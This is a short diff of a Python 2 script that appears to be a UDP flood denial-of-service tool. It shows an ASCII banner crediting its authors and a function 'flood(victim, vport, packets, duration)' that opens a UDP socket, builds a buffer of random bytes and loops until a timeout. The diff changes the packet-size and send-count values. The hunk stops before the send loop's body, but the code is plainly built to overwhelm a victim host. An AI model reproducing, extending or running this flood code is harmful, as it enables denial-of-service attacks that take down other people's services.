@@ -12,11 +12,11 @@ def usage():
     print "#\033[1;91mVersion: 1.0        \033[1;32m##     #      #                                 ##"
     print "#\033[1;91mTQAdmin: MrNath, MrTod, MrPrek                                      \033[1;32m##"
     print "#######################################################################"
-def flood(victim, vport, packet, duration):
+def flood(victim, vport, packets, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(20000)
+    bytes = random._urandom(packets)
     timeout =  time.time() + duration
-    sent = packet
+    sent = 25000
     while 1:
         if time.time() > timeout:
             break
